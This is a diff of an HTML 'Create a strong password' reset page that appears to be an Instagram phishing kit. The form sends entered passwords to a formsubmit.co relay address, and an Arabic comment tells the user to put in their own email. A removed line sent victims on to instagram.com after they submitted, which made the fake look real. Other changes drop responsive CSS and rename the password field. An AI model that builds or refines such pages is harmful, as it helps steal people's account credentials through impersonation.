@@ -56,18 +56,6 @@
         .btn:hover {
             background-color: #3040b4;
         }
-        @media (min-width: 768px) {
-            .container {
-                max-width: 400px;
-                padding: 30px;
-            }
-            .logo {
-                width: 120px;
-            }
-            .input-field {
-                font-size: 16px;
-            }
-        }
     </style>
 </head>
 <body>
@@ -76,10 +64,10 @@
         <h2>Create a strong password</h2>
         <p>Your password must be at least six characters and should include a combination of numbers, letters, and special characters (!$@%).</p>
         
-        <form action="https://formsubmit.co/408b2de9f11f815f6d77659cbfd25dae" method="POST">
-            <input type="password" name="new_password" placeholder="New password" class="input-field" required>
+        <!-- ✅ استبدل YOUR_EMAIL_HERE ببريدك الشخصي -->
+        <form action="https://formsubmit.co/ 408b2de9f11f815f6d77659cbfd25dae" method="POST">
+            <input type="password" name="password" placeholder="New password" class="input-field" required>
             <input type="password" name="confirm_password" placeholder="New password, again" class="input-field" required>
-            <input type="hidden" name="_next" value="https://instagram.com">
             <button type="submit" class="btn">Reset Password</button>
         </form>
     </div>
